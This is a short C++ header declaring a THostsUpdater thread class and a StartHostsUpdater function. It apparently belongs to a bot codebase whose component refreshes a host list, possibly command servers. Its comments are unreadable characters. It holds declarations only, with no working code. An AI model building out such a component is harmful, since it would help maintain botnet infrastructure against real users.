//---------------------------------------------------------------------------
//  ������ �������������� ������� ������
//---------------------------------------------------------------------------

#ifndef HostsAutoUpdateH
#define HostsAutoUpdateH
//---------------------------------------------------------------------------


#include "BotClasses.h"
#include "Strings.h"

//**************************************************************
//  THostsUpdater - ����� ��������������� ���������� ������
//**************************************************************
class THostsUpdater : public TBotThread
{
private:
	void Update(DWORD &UpdateInterval);
	void SaveHosts(const string &Buf);
protected:
    void DoExecute();
public:
	DWORD Interval;

	THostsUpdater();
	~THostsUpdater();
};

// ������� ��������� �������������� ���������� ������
void StartHostsUpdater();

//---------------------------------------------------------------------------
#endif
